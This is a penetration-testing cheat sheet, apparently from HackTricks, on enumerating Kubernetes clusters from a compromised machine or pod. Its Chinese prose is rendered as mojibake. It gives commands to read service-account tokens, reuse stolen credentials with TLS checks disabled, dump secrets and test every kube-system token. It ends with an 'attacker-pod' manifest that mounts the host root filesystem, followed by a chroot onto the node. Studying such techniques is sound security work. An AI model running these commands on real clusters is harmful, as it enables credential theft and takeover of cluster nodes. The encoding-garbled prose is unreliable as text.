# Kubernetes Enumeration

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Kubernetes Tokens

å¦‚æœä½ å·²ç»è·å¾—äº†å¯¹æŸå°æœºå™¨çš„è®¿é—®æƒé™ï¼Œç”¨æˆ·å¯èƒ½ä¼šè®¿é—®æŸä¸ª Kubernetes å¹³å°ã€‚ä»¤ç‰Œé€šå¸¸ä½äº **env var `KUBECONFIG`** æŒ‡å‘çš„æ–‡ä»¶ä¸­æˆ– **åœ¨ `~/.kube` ç›®å½•å†…**ã€‚

åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ï¼Œä½ å¯èƒ½ä¼šæ‰¾åˆ°åŒ…å« **è¿æ¥åˆ° API æœåŠ¡å™¨çš„ä»¤ç‰Œå’Œé…ç½®çš„é…ç½®æ–‡ä»¶**ã€‚åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ï¼Œä½ è¿˜å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç¼“å­˜æ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰ä¹‹å‰æ£€ç´¢çš„ä¿¡æ¯ã€‚

å¦‚æœä½ å·²ç»åœ¨ Kubernetes ç¯å¢ƒä¸­è·å¾—äº†å¯¹æŸä¸ª pod çš„è®¿é—®æƒé™ï¼Œè¿˜æœ‰å…¶ä»–åœ°æ–¹å¯ä»¥æ‰¾åˆ°ä»¤ç‰Œå’Œå½“å‰ K8 ç¯å¢ƒçš„ä¿¡æ¯ï¼š

### Service Account Tokens

åœ¨ç»§ç»­ä¹‹å‰ï¼Œå¦‚æœä½ ä¸çŸ¥é“ Kubernetes ä¸­çš„æœåŠ¡æ˜¯ä»€ä¹ˆï¼Œæˆ‘å»ºè®®ä½  **ç‚¹å‡»æ­¤é“¾æ¥å¹¶è‡³å°‘é˜…è¯»æœ‰å…³ Kubernetes æ¶æ„çš„ä¿¡æ¯ã€‚**

æ‘˜è‡ª Kubernetes [æ–‡æ¡£](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)ï¼š

_â€œå½“ä½ åˆ›å»ºä¸€ä¸ª pod æ—¶ï¼Œå¦‚æœä½ æ²¡æœ‰æŒ‡å®šæœåŠ¡è´¦æˆ·ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ†é…åŒä¸€å‘½åç©ºé—´ä¸­çš„_ é»˜è®¤ _æœåŠ¡è´¦æˆ·ã€‚â€_

**ServiceAccount** æ˜¯ä¸€ä¸ªç”± Kubernetes ç®¡ç†çš„å¯¹è±¡ï¼Œç”¨äºä¸ºåœ¨ pod ä¸­è¿è¡Œçš„è¿›ç¨‹æä¾›èº«ä»½ã€‚\
æ¯ä¸ªæœåŠ¡è´¦æˆ·éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³çš„ç§˜å¯†ï¼Œè¿™ä¸ªç§˜å¯†åŒ…å«ä¸€ä¸ªæ‰¿è½½ä»¤ç‰Œã€‚è¿™æ˜¯ä¸€ä¸ª JSON Web Token (JWT)ï¼Œç”¨äºåœ¨ä¸¤ä¸ªæ–¹ä¹‹é—´å®‰å…¨åœ°è¡¨ç¤ºå£°æ˜ã€‚

é€šå¸¸ **ä¸€ä¸ª** ç›®å½•ï¼š

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

åŒ…å«ä»¥ä¸‹æ–‡ä»¶ï¼š

* **ca.crt**ï¼šç”¨äºæ£€æŸ¥ Kubernetes é€šä¿¡çš„ CA è¯ä¹¦
* **namespace**ï¼šæŒ‡ç¤ºå½“å‰å‘½åç©ºé—´
* **token**ï¼šåŒ…å«å½“å‰ pod çš„ **æœåŠ¡ä»¤ç‰Œ**ã€‚

ç°åœ¨ä½ æœ‰äº†ä»¤ç‰Œï¼Œå¯ä»¥åœ¨ç¯å¢ƒå˜é‡ **`KUBECONFIG`** ä¸­æ‰¾åˆ° API æœåŠ¡å™¨ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·è¿è¡Œ `(env | set) | grep -i "kuber|kube`**`"`**

æœåŠ¡è´¦æˆ·ä»¤ç‰Œç”±ä½äºæ–‡ä»¶ **sa.key** ä¸­çš„å¯†é’¥ç­¾åï¼Œå¹¶ç”± **sa.pub** éªŒè¯ã€‚

åœ¨ **Kubernetes** çš„é»˜è®¤ä½ç½®ï¼š

* /etc/kubernetes/pki

åœ¨ **Minikube** çš„é»˜è®¤ä½ç½®ï¼š

* /var/lib/localkube/certs

### Hot Pods

_**Hot pods æ˜¯**_ åŒ…å«ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œçš„ podsã€‚ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œæ˜¯å…·æœ‰æ‰§è¡Œç‰¹æƒä»»åŠ¡æƒé™çš„ä»¤ç‰Œï¼Œä¾‹å¦‚åˆ—å‡ºç§˜å¯†ã€åˆ›å»º pods ç­‰ã€‚

## RBAC

å¦‚æœä½ ä¸çŸ¥é“ **RBAC** æ˜¯ä»€ä¹ˆï¼Œ**è¯·é˜…è¯»è¿™ä¸€éƒ¨åˆ†**ã€‚

## GUI Applications

* **k9s**ï¼šä¸€ä¸ªä»ç»ˆç«¯æšä¸¾ Kubernetes é›†ç¾¤çš„ GUIã€‚æŸ¥çœ‹ [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/) ä¸­çš„å‘½ä»¤ã€‚è¾“å…¥ `:namespace` å¹¶é€‰æ‹©æ‰€æœ‰ï¼Œç„¶ååœ¨æ‰€æœ‰å‘½åç©ºé—´ä¸­æœç´¢èµ„æºã€‚
* **k8slens**ï¼šæä¾›ä¸€äº›å…è´¹è¯•ç”¨å¤©æ•°ï¼š[https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

ä¸ºäº†æšä¸¾ K8s ç¯å¢ƒï¼Œä½ éœ€è¦ä»¥ä¸‹å‡ é¡¹ï¼š

* ä¸€ä¸ª **æœ‰æ•ˆçš„èº«ä»½éªŒè¯ä»¤ç‰Œ**ã€‚åœ¨å‰ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†åœ¨å“ªé‡Œæœç´¢ç”¨æˆ·ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚
* **Kubernetes API çš„åœ°å€**ï¼ˆ_**https://host:port**_ï¼‰ã€‚è¿™é€šå¸¸å¯ä»¥åœ¨ç¯å¢ƒå˜é‡å’Œ/æˆ– kube é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚
* **å¯é€‰**ï¼šç”¨äºéªŒè¯ API æœåŠ¡å™¨çš„ **ca.crt**ã€‚è¿™å¯ä»¥åœ¨ä¸ä»¤ç‰Œç›¸åŒçš„åœ°æ–¹æ‰¾åˆ°ã€‚è¿™å¯¹äºéªŒè¯ API æœåŠ¡å™¨è¯ä¹¦å¾ˆæœ‰ç”¨ï¼Œä½†ä½¿ç”¨ `--insecure-skip-tls-verify` ä¸ `kubectl` æˆ– `-k` ä¸ `curl` æ—¶ï¼Œä½ ä¸éœ€è¦è¿™ä¸ªã€‚

æœ‰äº†è¿™äº›ç»†èŠ‚ï¼Œä½ å¯ä»¥ **æšä¸¾ Kubernetes**ã€‚å¦‚æœ **API** å‡ºäºæŸç§åŸå› é€šè¿‡ **äº’è”ç½‘** **å¯è®¿é—®**ï¼Œä½ å¯ä»¥ç›´æ¥ä¸‹è½½è¯¥ä¿¡æ¯å¹¶ä»ä½ çš„ä¸»æœºæšä¸¾è¯¥å¹³å°ã€‚

ç„¶è€Œï¼Œé€šå¸¸ **API æœåŠ¡å™¨ä½äºå†…éƒ¨ç½‘ç»œä¸­**ï¼Œå› æ­¤ä½ éœ€è¦ **é€šè¿‡è¢«æ”»é™·çš„æœºå™¨åˆ›å»ºä¸€ä¸ªéš§é“** ä»¥ä»ä½ çš„æœºå™¨è®¿é—®å®ƒï¼Œæˆ–è€…ä½ å¯ä»¥ **ä¸Šä¼ ** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–ä½¿ç”¨ **`curl/wget/anything`** å¯¹ API æœåŠ¡å™¨æ‰§è¡ŒåŸå§‹ HTTP è¯·æ±‚ã€‚

### Differences between `list` and `get` verbs

ä½¿ç”¨ **`get`** æƒé™ï¼Œä½ å¯ä»¥è®¿é—®ç‰¹å®šèµ„äº§çš„ä¿¡æ¯ï¼ˆ_`describe` é€‰é¡¹åœ¨ `kubectl` ä¸­_ï¼‰APIï¼š
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
å¦‚æœæ‚¨æ‹¥æœ‰ **`list`** æƒé™ï¼Œåˆ™å¯ä»¥æ‰§è¡Œ API è¯·æ±‚ä»¥åˆ—å‡ºæŸç§èµ„äº§ï¼ˆ_`kubectl` ä¸­çš„ `get` é€‰é¡¹_ï¼‰ï¼š
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
å¦‚æœæ‚¨æ‹¥æœ‰ **`watch`** æƒé™ï¼Œåˆ™å¯ä»¥æ‰§è¡Œ API è¯·æ±‚ä»¥ç›‘è§†èµ„äº§ï¼š
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
ä»–ä»¬æ‰“å¼€ä¸€ä¸ªæµè¿æ¥ï¼Œæ¯å½“ Deployment å‘ç”Ÿå˜åŒ–ï¼ˆæˆ–åˆ›å»ºæ–°çš„ Deployment æ—¶ï¼‰å°±ä¼šè¿”å›å®Œæ•´çš„æ¸…å•ã€‚

{% hint style="danger" %}
ä»¥ä¸‹ `kubectl` å‘½ä»¤ä»…æŒ‡ç¤ºå¦‚ä½•åˆ—å‡ºå¯¹è±¡ã€‚å¦‚æœæ‚¨æƒ³è®¿é—®æ•°æ®ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ `describe` è€Œä¸æ˜¯ `get`
{% endhint %}

### ä½¿ç”¨ curl

åœ¨ pod å†…éƒ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¤šä¸ªç¯å¢ƒå˜é‡ï¼š
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
é»˜è®¤æƒ…å†µä¸‹ï¼Œpod å¯ä»¥ **è®¿é—®** åŸŸåä¸º **`kubernetes.default.svc`** çš„ **kube-api æœåŠ¡å™¨**ï¼Œæ‚¨å¯ä»¥åœ¨ **`/etc/resolv.config`** ä¸­çœ‹åˆ° kube ç½‘ç»œï¼Œåœ¨è¿™é‡Œæ‚¨å°†æ‰¾åˆ° kubernetes DNS æœåŠ¡å™¨çš„åœ°å€ï¼ˆåŒä¸€èŒƒå›´çš„ ".1" æ˜¯ kube-api ç«¯ç‚¹ï¼‰ã€‚
{% endhint %}

### ä½¿ç”¨ kubectl

æ‹¥æœ‰ä»¤ç‰Œå’Œ API æœåŠ¡å™¨åœ°å€åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ kubectl æˆ– curl è®¿é—®å®ƒï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

é»˜è®¤æƒ…å†µä¸‹ï¼ŒAPISERVER ä½¿ç”¨ `https://` åè®®è¿›è¡Œé€šä¿¡

{% code overflow="wrap" %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
{% endcode %}

> å¦‚æœ URL ä¸­æ²¡æœ‰ `https://`ï¼Œæ‚¨å¯èƒ½ä¼šæ”¶åˆ°ç±»ä¼¼äº Bad Request çš„é”™è¯¯ã€‚

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°[**å®˜æ–¹ kubectl å¤‡å¿˜å•**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)ã€‚ä»¥ä¸‹éƒ¨åˆ†çš„ç›®æ ‡æ˜¯ä»¥æœ‰åºçš„æ–¹å¼å±•ç¤ºä¸åŒçš„é€‰é¡¹ï¼Œä»¥æšä¸¾å’Œç†è§£æ‚¨å·²è·å¾—è®¿é—®æƒé™çš„æ–° K8sã€‚

è¦æ‰¾åˆ° `kubectl` å‘é€çš„ HTTP è¯·æ±‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å‚æ•° `-v=8`

#### MitM kubectl - ä»£ç† kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### å½“å‰é…ç½®

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

å¦‚æœä½ æˆåŠŸçªƒå–äº†ä¸€äº›ç”¨æˆ·å‡­æ®ï¼Œä½ å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„æ–¹å¼**åœ¨æœ¬åœ°é…ç½®å®ƒä»¬**ï¼š
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### è·å–æ”¯æŒçš„èµ„æº

é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œæ‚¨å°†çŸ¥é“å¯ä»¥åˆ—å‡ºæ‰€æœ‰æœåŠ¡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### è·å–å½“å‰æƒé™

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

æ£€æŸ¥æ‚¨çš„æƒé™çš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·ï¼š[**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹å†…å®¹ä¸­äº†è§£æ›´å¤šå…³äº**Kubernetes RBAC**çš„ä¿¡æ¯ï¼š

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**ä¸€æ—¦æ‚¨çŸ¥é“è‡ªå·±æ‹¥æœ‰çš„æƒé™**ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥ç¡®å®š**æ‚¨æ˜¯å¦å¯ä»¥åˆ©ç”¨å®ƒä»¬**æ¥æå‡æƒé™ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### è·å–å…¶ä»–è§’è‰²

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### è·å–å‘½åç©ºé—´

Kubernetes æ”¯æŒ **å¤šä¸ªè™šæ‹Ÿé›†ç¾¤**ï¼Œè¿™äº›è™šæ‹Ÿé›†ç¾¤ç”±åŒä¸€ä¸ªç‰©ç†é›†ç¾¤æ”¯æŒã€‚è¿™äº›è™šæ‹Ÿé›†ç¾¤ç§°ä¸º **å‘½åç©ºé—´**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### è·å–ç§˜å¯†

{% tabs %}
{% tab title="kubectl" %}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

å¦‚æœæ‚¨å¯ä»¥è¯»å–ç§˜å¯†ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¡Œè·å–ä¸æ¯ä¸ªä»¤ç‰Œç›¸å…³çš„æƒé™ï¼š
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### è·å–æœåŠ¡è´¦æˆ·

å¦‚æœ¬é¡µå¼€å¤´æ‰€è¿°ï¼Œ**å½“ä¸€ä¸ª pod è¿è¡Œæ—¶ï¼Œé€šå¸¸ä¼šåˆ†é…ä¸€ä¸ªæœåŠ¡è´¦æˆ·ç»™å®ƒ**ã€‚å› æ­¤ï¼Œåˆ—å‡ºæœåŠ¡è´¦æˆ·ã€å®ƒä»¬çš„æƒé™ä»¥åŠå®ƒä»¬è¿è¡Œçš„ä½ç½®å¯èƒ½å…è®¸ç”¨æˆ·æå‡æƒé™ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} API
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### è·å–éƒ¨ç½²

éƒ¨ç½²æŒ‡å®šäº†éœ€è¦**è¿è¡Œ**çš„**ç»„ä»¶**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} API
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### è·å– Pods

Pods æ˜¯å®é™…å°†è¦ **è¿è¡Œ** çš„ **å®¹å™¨**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### è·å–æœåŠ¡

Kubernetes **æœåŠ¡**ç”¨äº**åœ¨ç‰¹å®šç«¯å£å’Œ IP ä¸Šæš´éœ²æœåŠ¡**ï¼ˆè¿™å°†å……å½“å®é™…æä¾›æœåŠ¡çš„ pod çš„è´Ÿè½½å‡è¡¡å™¨ï¼‰ã€‚äº†è§£åœ¨å“ªé‡Œå¯ä»¥æ‰¾åˆ°å…¶ä»–æœåŠ¡ä»¥å°è¯•æ”»å‡»æ˜¯å¾ˆæœ‰è¶£çš„ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### è·å–èŠ‚ç‚¹

è·å–**é›†ç¾¤å†…é…ç½®çš„æ‰€æœ‰èŠ‚ç‚¹**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get nodes
```
{% endtab %}

{% tab title="API" %} API
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### è·å– DaemonSets

**DaeamonSets** å…è®¸ç¡®ä¿ **ç‰¹å®šçš„ pod åœ¨é›†ç¾¤çš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šè¿è¡Œ**ï¼ˆæˆ–åœ¨é€‰å®šçš„èŠ‚ç‚¹ä¸Šï¼‰ã€‚å¦‚æœæ‚¨åˆ é™¤ DaemonSetï¼Œå—å…¶ç®¡ç†çš„ pods ä¹Ÿå°†è¢«åˆ é™¤ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### è·å– cronjob

Cron jobs å…è®¸ä½¿ç”¨ç±»ä¼¼ crontab çš„è¯­æ³•è°ƒåº¦å¯åŠ¨ä¸€ä¸ªå°†æ‰§è¡ŒæŸäº›æ“ä½œçš„ podã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### è·å– configMap

configMap é€šå¸¸åŒ…å«å¤§é‡ä¿¡æ¯å’Œé…ç½®æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æä¾›ç»™åœ¨ Kubernetes ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚é€šå¸¸ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è®¸å¤šç”¨äºè¿æ¥å’ŒéªŒè¯å…¶ä»–å†…éƒ¨/å¤–éƒ¨æœåŠ¡çš„å¯†ç ã€ç§˜å¯†å’Œä»¤ç‰Œã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}
{% endtabs %}

### è·å–ç½‘ç»œç­–ç•¥ / Cilium ç½‘ç»œç­–ç•¥

{% tabs %}
{% tab title="ç¬¬ä¸€ä¸ªæ ‡ç­¾" %}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{% endtab %}
{% endtabs %}

### è·å–æ‰€æœ‰å†…å®¹ / å…¨éƒ¨

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all
```
{% endtab %}
{% endtabs %}

### **è·å–æ‰€æœ‰ç”± helm ç®¡ç†çš„èµ„æº**

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{% endtab %}
{% endtabs %}

### **è·å– Pods æ¶ˆè€—**

{% tabs %}
{% tab title="kubectl" %}
```bash
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### ä» pod ä¸­é€ƒé€¸

å¦‚æœæ‚¨èƒ½å¤Ÿåˆ›å»ºæ–°çš„ podï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿä»ä¸­é€ƒé€¸åˆ°èŠ‚ç‚¹ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ yaml æ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–° podï¼Œåˆ‡æ¢åˆ°åˆ›å»ºçš„ podï¼Œç„¶å chroot è¿›å…¥èŠ‚ç‚¹çš„ç³»ç»Ÿã€‚æ‚¨å¯ä»¥ä½¿ç”¨å·²ç»å­˜åœ¨çš„ pod ä½œä¸º yaml æ–‡ä»¶çš„å‚è€ƒï¼Œå› ä¸ºå®ƒä»¬æ˜¾ç¤ºäº†ç°æœ‰çš„é•œåƒå’Œè·¯å¾„ã€‚
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> å¦‚æœæ‚¨éœ€è¦åœ¨ç‰¹å®šèŠ‚ç‚¹ä¸Šåˆ›å»º podï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–èŠ‚ç‚¹ä¸Šçš„æ ‡ç­¾
>
> `k get nodes --show-labels`
>
> é€šå¸¸ï¼Œkubernetes.io/hostname å’Œ node-role.kubernetes.io/master æ˜¯é€‰æ‹©çš„å¥½æ ‡ç­¾ã€‚

ç„¶åæ‚¨åˆ›å»ºæ‚¨çš„ attack.yaml æ–‡ä»¶
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ä¹‹åï¼Œæ‚¨åˆ›å»º pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
ç°åœ¨æ‚¨å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼åˆ‡æ¢åˆ°åˆ›å»ºçš„ pod
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
æœ€åï¼Œæ‚¨ chroot è¿›å…¥èŠ‚ç‚¹çš„ç³»ç»Ÿ
```bash
chroot /root /bin/bash
```
ä¿¡æ¯æ¥æºï¼š[Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## å‚è€ƒæ–‡çŒ®

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
